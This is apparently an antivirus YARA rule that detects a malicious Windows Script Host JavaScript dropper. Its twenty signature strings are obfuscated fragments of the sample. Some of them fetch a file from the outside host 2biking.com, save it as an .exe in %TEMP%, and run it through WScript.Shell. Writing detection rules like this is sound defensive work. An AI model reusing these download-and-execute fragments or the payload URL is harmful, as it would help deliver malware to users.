rule sig_20160328_64e02182ac01a5be9d4f8ff9fd606e9f {
  meta:
    description = "datamaliciousorder - file 20160328_64e02182ac01a5be9d4f8ff9fd606e9f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fc51dcbf93f96765700d87a03098ba34559c0491165657abaa86916ec57fea0f"

  strings:
    $s1  = "function Lffrmzsj() {return Dgrjtcvqi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"t4LF8VJ7cA1n4hdG.exe\";};" fullword ascii
    $s2  = "Sndkxdzqao[Uewdurdiv](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Uireee](Yulcxmngvh() * 11)} while (Sndkxdzqao[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Dgrjtcvqi = function Awkizgm() {return WScript[Ddjwdjkej](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Qzolamyg(Omecplk, Ntvjhcwclq){return Omecplk - Ntvjhcwclq;};" fullword ascii
    $s6  = "function Yxoqsjpo() {return ((Qjjoyzzil == true) && (Qjjoyzzil == Gdikhahcxy)) ? 1 : Vpzgvqwizt;};" fullword ascii
    $s7  = "function Cenfbyudv(Avbpkb){Dgrjtcvqi[\"Run\"](Avbpkb, Vpzgvqwizt, Vpzgvqwizt);};" fullword ascii
    $s8  = "var Qjjoyzzil = false;" fullword ascii
    $s9  = "function Yulcxmngvh(){return 22;};" fullword ascii
    $s10 = "function Omfdzlclvk(){return Ddjwdjkej;};" fullword ascii
    $s11 = "function Unytyqldox(Bzgvidywlf) {var Xwhrcmoy = (1, 2, 3, 4, 5, Bzgvidywlf); return Xwhrcmoy;};" fullword ascii
    $s12 = "Qjjoyzzil = true; " fullword ascii
    $s13 = "function Vmhfjghjv()" fullword ascii
    $s14 = "function Ckncsqfj(){return Ecjhjkytyn;};" fullword ascii
    $s15 = "Gdikhahcxy = true; " fullword ascii
    $s16 = "var Waxfsvno = new this[\"Date\"]();" fullword ascii
    $s17 = "var Ckdtqdhqs = false;" fullword ascii
    $s18 = " while (Vaqmfrxvpj){" fullword ascii
    $s19 = "var Gdikhahcxy = false;" fullword ascii
    $s20 = "return Qzolamyg(Grweohhrjb, Eujsrxjl);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}